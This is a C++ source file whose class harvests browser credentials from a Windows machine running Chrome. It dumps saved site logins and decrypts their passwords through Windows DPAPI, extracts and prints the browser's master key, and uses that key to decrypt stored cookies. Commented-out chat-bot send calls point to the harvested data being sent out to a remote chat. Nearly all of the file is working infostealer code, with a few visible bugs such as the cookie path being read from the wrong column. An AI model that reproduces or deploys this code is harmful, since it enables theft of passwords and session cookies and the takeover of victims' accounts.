#include "chromium_processor.hpp"

ChromiumProcessor::ChromiumProcessor()
{
    MasterKey=nullptr;
    Cookies=new vector <Cookie>;
#if defined(__WIN64__)
    string appDataLocal_path=std::experimental::filesystem::temp_directory_path().parent_path().parent_path().string();
    userdata_path=appDataLocal_path+string("\\Google\\Chrome\\User Data");
    pass_path=userdata_path+string("\\Default\\Login Data");
    cookies_path=userdata_path+string("\\Default\\Cookies");
#elif defined(__linux__)
    userdata_path=
    pass_path="~/.config/google-chrome/Default/User Data";
    cookies_path="~/.config/google-chrome/Default/Cookies";
#endif
}

ChromiumProcessor::~ChromiumProcessor()
{
    delete Cookies;
}

stringstream ChromiumProcessor::ExtractChromiumPasswords()
{
    cout<<"ChromiumProcessor::getChromiumPW()"<<endl;
    stringstream dump(string(""));
    if(experimental::filesystem::exists(pass_path))
    {
        cout<<"exists"<<pass_path<<endl;
        int rc=sqlite3_open(pass_path.c_str(), &ChromiumDB);
        if(rc!=SQLITE_OK)
        {
            cerr<<"DB Error: "<<sqlite3_errmsg(ChromiumDB)<<endl;
            //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
        }
        else
        {
            //bot_sender.send(ChatID, pass.str());
        }
    }
    else
    {
        cerr<<"don't exists"<<pass_path<<endl;
        throw invalid_argument("wrong pass_path");
        return dump;
    }

    string sql="SELECT action_url, username_value, password_value FROM logins";

    sqlite3_stmt *pStmt;
    int rc, i;
    rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
    if(rc!=SQLITE_OK)
    {
        dump<<"statement failed rc="<<rc<<endl;
        return dump;
    }

    rc=sqlite3_step(pStmt);
    //cout<<"RC: "<<rc<<endl;
    while(rc==SQLITE_ROW)
    {
        dump<<sqlite3_column_text(pStmt, 0)<<endl;
        dump<<(char *)sqlite3_column_text(pStmt, 1)<<endl;

        DATA_BLOB encryptedPass, decryptedPass;

        encryptedPass.cbData=(DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedPass.pbData=(byte *)malloc(encryptedPass.cbData);

        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

        CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
        if(decryptedPass.pbData==nullptr || decryptedPass.cbData<1)
        {
            i=0;
            while(encryptedPass.pbData[i])
            {
                dump<<encryptedPass.pbData[i];
                i++;
            }
        }
        else
        {
            i=0;
            while(decryptedPass.pbData[i])
            {
                dump<<decryptedPass.pbData[i];
                i++;
            }
        }
        free(encryptedPass.pbData);
        rc=sqlite3_step(pStmt);
    }
    rc=sqlite3_finalize(pStmt);
    sqlite3_close(ChromiumDB);
    return dump;
}

int ChromiumProcessor::ExtractChromiumCookies()
{
    cout<<"ChromiumProcessor::getChromiumCookies()"<<endl;
    if(experimental::filesystem::exists(cookies_path))
    {
        //cout<<"exists "<<cookies_path<<endl;
        int rc=sqlite3_open(cookies_path.c_str(), &ChromiumDB);
        if(rc!=SQLITE_OK)
        {
            cerr<<"DB Error: "<<sqlite3_errmsg(ChromiumDB)<<endl;
            return -3;
            //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
        }
        cout<<"DB is Ok."<<endl;
        //bot_sender.send(ChatID, cookies.str());
    }
    else
    {
        cerr<<"File don't exists"<<cookies_path<<endl;
        throw invalid_argument("wrong cookies_path");
        return -2;
    }

    if(MasterKey==nullptr)
    {
        this->ExtractChromiumMasterKey();
    }

    string sql="SELECT HOST_KEY, path, encrypted_value FROM cookies";
    sqlite3_stmt *pStmt;

    int rc;
    rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
    if(rc!=SQLITE_OK)
    {
        cerr<<"sqlite: statement failed, rc="<<rc<<endl;
        return -1;
    }

    rc=sqlite3_step(pStmt);
    while(rc==SQLITE_ROW)
    {
        Cookie newCookie;
        newCookie.Host=string((char *)sqlite3_column_text(pStmt, 0));
        newCookie.Path=string((char *)sqlite3_column_text(pStmt, 0));

        DATA_BLOB encryptedCookie;

        encryptedCookie.cbData=sqlite3_column_bytes(pStmt, 2);
        encryptedCookie.pbData=new unsigned char[encryptedCookie.cbData];
        memcpy(encryptedCookie.pbData, sqlite3_column_blob(pStmt, 2), encryptedCookie.cbData);

        newCookie.Value=EasyDecrypt(&encryptedCookie, MasterKey);
        if(newCookie.Value==string(""))
        {
            unsigned long int i;
            string cooDataBuf;
            for(i=0; encryptedCookie.pbData!=nullptr && i<encryptedCookie.cbData; i++)
            {
                fprintf(stdout, "%.2x", encryptedCookie.pbData[i]&0xFF);
                cooDataBuf.append(1, encryptedCookie.pbData[i]);
            }
            fprintf(stdout, " < cookie bin data (%lu bytes)\n", i);
            newCookie.Value=string((char *)encryptedCookie.pbData);
        }

        delete [] encryptedCookie.pbData;
        Cookies->push_back(newCookie);
        rc=sqlite3_step(pStmt);
    }
    rc=sqlite3_finalize(pStmt);
    sqlite3_close(ChromiumDB);
    return 0;
}

unsigned char *ChromiumProcessor::ExtractChromiumMasterKey()
{
    cout<<"ChromiumProcessor::getMasterKey()"<<endl;
    string LocalStateFile_path=userdata_path, stMasterKey;
    if(LocalStateFile_path.find("Opera")!=string::npos)
    {
        LocalStateFile_path += "\\Opera Stable\\Local State";
    }
    else
    {
        LocalStateFile_path += "\\Local State";
    }
    if(!experimental::filesystem::exists(LocalStateFile_path))
    {
        cerr<<"file don't exists: "<<LocalStateFile_path<<endl;
        return 0;
    }
    if(LocalStateFile_path!=prevBrowser_path)
    {
        prevBrowser_path=LocalStateFile_path;
    }
    else
    {
        if(MasterKey!=nullptr)
        {
            return MasterKey;
        }
    }

    json_error_t err;
    json_t *LocalState=json_load_file(LocalStateFile_path.c_str(), 0, &err);
    if(LocalState == NULL)
    {
        fprintf(stderr, "json file is incorrect: %s\n", LocalStateFile_path.c_str());
        fprintf(stderr, "error text: %s\n", err.text);
        return 0;
    }
    json_t *os_crypt=json_object_get(LocalState, "os_crypt");
    if(os_crypt == NULL)
    {
        fprintf(stderr, "error: have no 'os_crypt' object in JSON\n");
        return(0);
    }
    if(os_crypt->type == JSON_OBJECT)
    {
        if(json_object_get(os_crypt, "encrypted_key")->type == JSON_STRING)
        {
            stMasterKey=json_string_value(json_object_get(os_crypt, "encrypted_key"));
        }
    }

    stMasterKey=base64_decode(stMasterKey);
    fprintf(stdout, "Chromium MasterKey: '");
    for(unsigned long long int i=0; i<stMasterKey.length(); i++)
    {
        fprintf(stdout, "%.2x", stMasterKey.data()[i]&0xFF);
    }
    fprintf(stdout, "' (hex format, encrypted)\n");

    unsigned int keyLen=stMasterKey.length()-5;
    DATA_BLOB bRawMasterKey;
    bRawMasterKey.cbData=keyLen;
    bRawMasterKey.pbData=new unsigned char[keyLen];
    memcpy(bRawMasterKey.pbData, &stMasterKey.data()[5], keyLen);

    DATA_BLOB finalK=DPAPIDecrypt(&bRawMasterKey);
    if(finalK.cbData>0)
    {
        if(MasterKey!=nullptr)
        {
            delete [] MasterKey;
        }
        MasterKey=new unsigned char[finalK.cbData];
        memcpy(MasterKey, finalK.pbData, finalK.cbData);
    }
    delete [] bRawMasterKey.pbData;

    fprintf(stdout, "Chromium MasterKey: '");
    for(unsigned long int i=0; i<finalK.cbData; i++)
    {
        fprintf(stdout, "%.2x", MasterKey[i]&0xFF);
    }
    fprintf(stdout, "' (hex format, decrypted)\n");

    return MasterKey;
}
